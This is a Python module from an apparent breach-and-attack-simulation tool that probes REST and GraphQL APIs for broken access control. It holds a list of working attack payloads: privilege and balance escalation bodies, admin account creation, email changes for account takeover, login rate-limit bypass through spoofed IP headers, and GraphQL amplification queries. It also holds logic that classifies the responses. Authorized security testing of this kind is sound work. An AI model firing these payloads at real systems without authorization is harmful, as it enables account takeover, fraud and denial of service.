"""
API-specific abuse testing module.

Tests for real-world API vulnerabilities that modern attackers exploit:
- Mass assignment / parameter pollution
- Broken function-level authorization (BFLA) - horizontal and vertical
- Rate limit bypass techniques
- API versioning bypass
- GraphQL batching DoS
- Excessive data exposure (verbose responses)
- BOLA/IDOR via API enumeration

MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""

from __future__ import annotations

import json
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# API abuse payloads organized by attack type
# Format: ATTACK_TYPE:description|method|path|body|content_type|extra_headers

API_ABUSE_PAYLOADS = [
    # --- Mass Assignment / Auto-Binding ---
    # Add privileged fields to user update requests
    'MASS_ASSIGN:Role escalation via user update|PUT|/api/users/me|{"role":"admin","is_admin":true}|application/json|',
    'MASS_ASSIGN:Price manipulation on order|POST|/api/orders|{"product_id":1,"quantity":1,"price":0.01,"discount":100}|application/json|',
    'MASS_ASSIGN:Account type escalation|PATCH|/api/users/me|{"account_type":"premium","plan":"enterprise"}|application/json|',
    'MASS_ASSIGN:Verified flag bypass|PUT|/api/users/me|{"email_verified":true,"phone_verified":true}|application/json|',
    'MASS_ASSIGN:Balance manipulation|PATCH|/api/wallet|{"balance":999999,"credits":999999}|application/json|',
    'MASS_ASSIGN:Permission escalation|PUT|/api/users/me|{"permissions":["admin","superadmin","root"],"group":"administrators"}|application/json|',
    'MASS_ASSIGN:Org owner assignment|PATCH|/api/organizations/1|{"owner_id":"attacker_id","billing_email":"attacker@evil.com"}|application/json|',

    # --- Broken Function Level Authorization (BFLA) ---
    # Accessing admin/internal API endpoints as regular user
    'BFLA_VERTICAL:Admin user listing|GET|/api/admin/users|||',
    'BFLA_VERTICAL:Admin config endpoint|GET|/api/admin/config|||',
    'BFLA_VERTICAL:Admin debug endpoint|GET|/api/admin/debug|||',
    'BFLA_VERTICAL:Internal metrics|GET|/api/internal/metrics|||',
    'BFLA_VERTICAL:System health endpoint|GET|/api/system/health|||',
    'BFLA_VERTICAL:Admin delete user|DELETE|/api/admin/users/1|||',
    'BFLA_VERTICAL:Admin create user|POST|/api/admin/users|{"username":"hacker","password":"test","role":"admin"}|application/json|',
    'BFLA_VERTICAL:Swagger/OpenAPI docs|GET|/api/swagger.json|||',
    'BFLA_VERTICAL:GraphQL admin mutation|POST|/graphql|{"query":"mutation{deleteUser(id:1){id}}"}|application/json|',
    'BFLA_VERTICAL:Actuator endpoints|GET|/actuator/env|||',
    'BFLA_VERTICAL:Debug vars|GET|/debug/vars|||',

    # Horizontal privilege escalation (accessing other users' data)
    'BFLA_HORIZONTAL:Other user profile|GET|/api/users/2|||',
    'BFLA_HORIZONTAL:Other user orders|GET|/api/users/2/orders|||',
    'BFLA_HORIZONTAL:Other user settings|GET|/api/users/2/settings|||',
    'BFLA_HORIZONTAL:Other user documents|GET|/api/users/2/documents|||',
    'BFLA_HORIZONTAL:Modify other user|PUT|/api/users/2|{"email":"hacked@evil.com"}|application/json|',

    # --- Rate Limit Bypass ---
    # Techniques to bypass API rate limiting
    'RATE_BYPASS:X-Forwarded-For rotation|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-Forwarded-For:127.0.0.1',
    'RATE_BYPASS:X-Real-IP bypass|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-Real-IP:10.0.0.1',
    'RATE_BYPASS:X-Originating-IP bypass|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-Originating-IP:192.168.1.1',
    'RATE_BYPASS:X-Client-IP bypass|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-Client-IP:172.16.0.1',
    'RATE_BYPASS:True-Client-IP bypass|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|True-Client-IP:10.10.10.10',
    'RATE_BYPASS:X-Forwarded-Host bypass|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-Forwarded-Host:internal.api',
    'RATE_BYPASS:Case variation endpoint|POST|/Api/Auth/Login|{"username":"admin","password":"test"}|application/json|',
    'RATE_BYPASS:Trailing slash bypass|POST|/api/auth/login/|{"username":"admin","password":"test"}|application/json|',
    'RATE_BYPASS:Null byte path bypass|POST|/api/auth/login%00|{"username":"admin","password":"test"}|application/json|',
    'RATE_BYPASS:Dot segment bypass|POST|/api/./auth/login|{"username":"admin","password":"test"}|application/json|',
    'RATE_BYPASS:Double URL encode|POST|/api/auth/%6Cogin|{"username":"admin","password":"test"}|application/json|',
    'RATE_BYPASS:HTTP method override|POST|/api/auth/login|{"username":"admin","password":"test"}|application/json|X-HTTP-Method-Override:PUT',

    # --- API Versioning Bypass ---
    # Accessing older API versions that may lack security controls
    'VERSION_BYPASS:v1 fallback|GET|/api/v1/users|||',
    'VERSION_BYPASS:v0 internal|GET|/api/v0/users|||',
    'VERSION_BYPASS:No version prefix|GET|/users|||',
    'VERSION_BYPASS:Beta API|GET|/api/beta/users|||',
    'VERSION_BYPASS:Staging API|GET|/api/staging/users|||',
    'VERSION_BYPASS:Accept header v1|GET|/api/users|||Accept:application/vnd.api.v1+json',
    'VERSION_BYPASS:Accept header v0|GET|/api/users|||Accept:application/vnd.api.v0+json',
    'VERSION_BYPASS:Version query param|GET|/api/users?version=1|||',
    'VERSION_BYPASS:Legacy prefix|GET|/legacy/api/users|||',

    # --- GraphQL Batching DoS ---
    # Abusing GraphQL query batching for amplification attacks
    'GQL_BATCH_DOS:Introspection batch (10x)|POST|/graphql|[' + ','.join(['{"query":"{__schema{types{name fields{name}}}}"}'] * 10) + ']|application/json|',
    'GQL_BATCH_DOS:Nested query depth attack|POST|/graphql|{"query":"{user(id:1){friends{friends{friends{friends{friends{name}}}}}}}"}|application/json|',
    'GQL_BATCH_DOS:Alias amplification (50x)|POST|/graphql|{"query":"{' + ' '.join([f'a{i}:__typename' for i in range(50)]) + '}"}|application/json|',
    'GQL_BATCH_DOS:Field duplication attack|POST|/graphql|{"query":"{users{' + ' '.join(['id email name role password'] * 10) + '}}"}|application/json|',
    'GQL_BATCH_DOS:Directive overload|POST|/graphql|{"query":"{users @skip(if:false) @include(if:true) {id name}}"}|application/json|',
    'GQL_BATCH_DOS:Fragment cycle|POST|/graphql|{"query":"{...A} fragment A on Query {...B} fragment B on Query {...A}"}|application/json|',

    # --- Excessive Data Exposure ---
    # Checking if APIs return more data than needed
    'DATA_EXPOSURE:User listing with sensitive fields|GET|/api/users|||',
    'DATA_EXPOSURE:User detail with all fields|GET|/api/users/1|||',
    'DATA_EXPOSURE:Error with stack trace|GET|/api/nonexistent|||',
    'DATA_EXPOSURE:Debug mode check|GET|/api/users?debug=true|||',
    'DATA_EXPOSURE:Verbose mode check|GET|/api/users?verbose=1|||',
    'DATA_EXPOSURE:Include internal fields|GET|/api/users?fields=*|||',
    'DATA_EXPOSURE:Include relations|GET|/api/users?include=roles,permissions,tokens|||',
    'DATA_EXPOSURE:JSON response with metadata|GET|/api/users?format=json&meta=true|||',
]


class APIAbuseModule(BaseAttackModule):
    """
    API-specific abuse testing.

    Tests for vulnerabilities commonly found in REST and GraphQL APIs:
    - Mass assignment: injecting privileged fields into update requests
    - Broken function level authorization: accessing admin/internal endpoints
    - Rate limit bypass: header manipulation and path tricks
    - API versioning bypass: accessing older/unpatched API versions
    - GraphQL batching DoS: query amplification and depth attacks
    - Excessive data exposure: APIs returning sensitive/unnecessary fields
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="api_abuse",
            description="API abuse - mass assignment, BFLA, rate limit bypass, versioning bypass, GraphQL DoS, data exposure",
            category="api_abuse",
            mitre_technique_ids=["T1190", "T1087"],
            mitre_technique_names=["Exploit Public-Facing Application", "Account Discovery"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-915", "CWE-285", "CWE-770", "CWE-200"],
            tags=["api", "rest", "graphql", "mass-assignment", "bfla", "bola", "rate-limit"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(API_ABUSE_PAYLOADS)

        # Add custom mass assignment fields
        custom_fields = options.get("mass_assign_fields", [])
        if custom_fields:
            field_json = json.dumps({f: "attacker_value" for f in custom_fields})
            payloads.append(
                f"MASS_ASSIGN:Custom field injection|PUT|{options.get('path', '/api/users/me')}"
                f"|{field_json}|application/json|"
            )

        # Add custom admin paths
        admin_paths = options.get("admin_paths", [])
        for admin_path in admin_paths:
            payloads.append(f"BFLA_VERTICAL:Custom admin path|GET|{admin_path}|||")

        # Add custom user IDs for horizontal testing
        target_user_ids = options.get("target_user_ids", [])
        for uid in target_user_ids:
            payloads.append(f"BFLA_HORIZONTAL:Custom user IDOR|GET|/api/users/{uid}|||")

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("api_abuse", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        auth_token = options.get("auth_token", "")

        for payload in payloads:
            parts = payload.split(":", 1)
            attack_type = parts[0] if len(parts) > 1 else "UNKNOWN"
            details = parts[1] if len(parts) > 1 else parts[0]

            segments = details.split("|")
            if len(segments) < 3:
                continue

            description = segments[0]
            method = segments[1]
            path = segments[2]
            body = segments[3] if len(segments) > 3 and segments[3] else None
            content_type = segments[4] if len(segments) > 4 and segments[4] else "application/json"
            extra_headers_str = segments[5] if len(segments) > 5 and segments[5] else ""

            headers = {
                "X-BAS-Payload": payload[:200],
                "X-BAS-Attack-Type": attack_type,
                "X-BAS-Description": description,
            }

            # Add auth token if provided
            if auth_token:
                headers["Authorization"] = f"Bearer {auth_token}"

            # Add API key if provided
            api_key = options.get("api_key", "")
            if api_key:
                headers["X-API-Key"] = api_key

            # Parse extra headers from payload
            if extra_headers_str:
                for h_pair in extra_headers_str.split(","):
                    if ":" in h_pair:
                        h_key, h_val = h_pair.split(":", 1)
                        headers[h_key.strip()] = h_val.strip()

            # For rate limit bypass, generate multiple variants with different IPs
            if attack_type == "RATE_BYPASS" and "X-Forwarded-For" in extra_headers_str:
                for i in range(5):
                    varied_headers = {**headers, "X-Forwarded-For": f"10.{i}.{i}.{i}"}
                    req_id = uuid.uuid4().hex[:8]
                    requests.append(AttackRequest(
                        request_id=f"api-{req_id}",
                        target=target,
                        method=method,
                        path=path,
                        body=body,
                        content_type=content_type,
                        headers=varied_headers,
                    ))
                continue

            req_id = uuid.uuid4().hex[:8]
            requests.append(AttackRequest(
                request_id=f"api-{req_id}",
                target=target,
                method=method,
                path=path,
                body=body,
                content_type=content_type,
                headers=headers,
            ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        body_lower = body.lower()
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        payload_used = request.headers.get("X-BAS-Payload", payload)
        description = request.headers.get("X-BAS-Description", "")

        # --- Mass Assignment Detection ---
        if attack_type == "MASS_ASSIGN":
            if response.status_code in (200, 201, 204):
                # Check if privileged fields were accepted
                privilege_indicators = [
                    "admin", "role", "permission", "premium", "enterprise",
                    "verified", "balance", "credits", "owner",
                ]
                for ind in privilege_indicators:
                    if ind in body_lower:
                        try:
                            resp_data = json.loads(body)
                            # Check if the field value matches what we injected
                            flat_str = json.dumps(resp_data).lower()
                            if any(val in flat_str for val in ["admin", "true", "premium", "enterprise", "999999"]):
                                return ModuleResult(
                                    module_name="api_abuse",
                                    target=request.target,
                                    status=VulnStatus.VULNERABLE,
                                    payload_used=payload_used,
                                    response_code=response.status_code,
                                    response_body_preview=body[:500],
                                    elapsed_ms=response.elapsed_ms,
                                    evidence=f"Mass assignment: privileged field '{ind}' accepted in response",
                                    severity="critical",
                                    mitre_technique_id="T1190",
                                    detail={"detection_type": "mass_assignment", "field": ind},
                                )
                        except json.JSONDecodeError:
                            pass

                # If the update succeeded without explicit rejection
                rejection_words = ["forbidden", "unauthorized", "not allowed", "denied", "invalid", "error"]
                if not any(r in body_lower for r in rejection_words):
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"Mass assignment: server accepted update without rejecting privileged fields ({description})",
                        severity="high",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "mass_assignment_potential"},
                    )

        # --- BFLA Vertical Detection ---
        if attack_type == "BFLA_VERTICAL":
            if response.status_code in (200, 201):
                # Admin/internal endpoint accessible
                admin_content_indicators = [
                    "users", "config", "debug", "metrics", "health",
                    "stack", "trace", "environment", "swagger", "openapi",
                    "actuator", "beans", "mappings",
                ]
                if any(ind in body_lower for ind in admin_content_indicators) and len(body) > 20:
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"BFLA: admin/internal endpoint accessible - {description} ({request.path})",
                        severity="critical",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "bfla_vertical", "path": request.path},
                    )

        # --- BFLA Horizontal Detection ---
        if attack_type == "BFLA_HORIZONTAL":
            if response.status_code == 200 and len(body) > 20:
                # Successfully accessed another user's data
                user_data_indicators = [
                    "email", "name", "phone", "address", "order",
                    "document", "setting", "preference",
                ]
                if any(ind in body_lower for ind in user_data_indicators):
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"BFLA horizontal: accessed other user's data - {description} ({request.path})",
                        severity="high",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "bfla_horizontal", "path": request.path},
                    )

        # --- Rate Limit Bypass Detection ---
        if attack_type == "RATE_BYPASS":
            # If we got a 200 instead of 429, the bypass worked
            if response.status_code in (200, 201) and "X-Forwarded-For" in str(request.headers):
                return ModuleResult(
                    module_name="api_abuse",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Rate limit bypass: {description} - request succeeded with spoofed headers",
                    severity="medium",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "rate_limit_bypass"},
                )

        # --- API Version Bypass Detection ---
        if attack_type == "VERSION_BYPASS":
            if response.status_code == 200 and len(body) > 20:
                return ModuleResult(
                    module_name="api_abuse",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"API version bypass: older/alternate API version accessible - {description} ({request.path})",
                    severity="medium",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "version_bypass", "path": request.path},
                )

        # --- GraphQL Batching DoS Detection ---
        if attack_type == "GQL_BATCH_DOS":
            if response.status_code == 200:
                try:
                    resp_data = json.loads(body)
                    # Check if batched queries were all executed
                    if isinstance(resp_data, list) and len(resp_data) > 5:
                        return ModuleResult(
                            module_name="api_abuse",
                            target=request.target,
                            status=VulnStatus.VULNERABLE,
                            payload_used=payload_used,
                            response_code=response.status_code,
                            response_body_preview=body[:500],
                            elapsed_ms=response.elapsed_ms,
                            evidence=f"GraphQL batching DoS: server processed {len(resp_data)} batched queries without limit",
                            severity="medium",
                            mitre_technique_id="T1190",
                            detail={"detection_type": "gql_batch_dos", "batch_count": len(resp_data)},
                        )
                except json.JSONDecodeError:
                    pass

                # Check for deep query execution
                if "friends" in body_lower or "__schema" in body_lower:
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"GraphQL query depth/complexity: {description} - server executed deep query",
                        severity="medium",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "gql_depth_attack"},
                    )

            # Slow response indicates successful amplification
            if response.elapsed_ms > 5000:
                return ModuleResult(
                    module_name="api_abuse",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"GraphQL DoS: slow response ({response.elapsed_ms:.0f}ms) indicates amplification",
                    severity="medium",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "gql_amplification"},
                )

        # --- Excessive Data Exposure Detection ---
        if attack_type == "DATA_EXPOSURE":
            if response.status_code == 200:
                sensitive_fields = [
                    "password", "secret", "token", "api_key", "apikey",
                    "private_key", "ssn", "social_security", "credit_card",
                    "card_number", "cvv", "hash", "salt", "internal_id",
                    "stack_trace", "traceback", "debug", "sql_query",
                ]
                found_fields = [f for f in sensitive_fields if f in body_lower]
                if found_fields:
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"Excessive data exposure: sensitive fields in response: {', '.join(found_fields)}",
                        severity="high",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "data_exposure", "fields": found_fields},
                    )

            # Error responses with stack traces
            if response.status_code >= 400:
                stack_indicators = [
                    "traceback", "stack trace", "at line", "exception",
                    "error in", "caused by", "file \"", "syntaxerror",
                    "typeerror", "nullpointerexception",
                ]
                if any(ind in body_lower for ind in stack_indicators) and len(body) > 100:
                    return ModuleResult(
                        module_name="api_abuse",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence="Excessive data exposure: stack trace/debug info in error response",
                        severity="medium",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "error_disclosure"},
                    )

        return ModuleResult(
            module_name="api_abuse",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
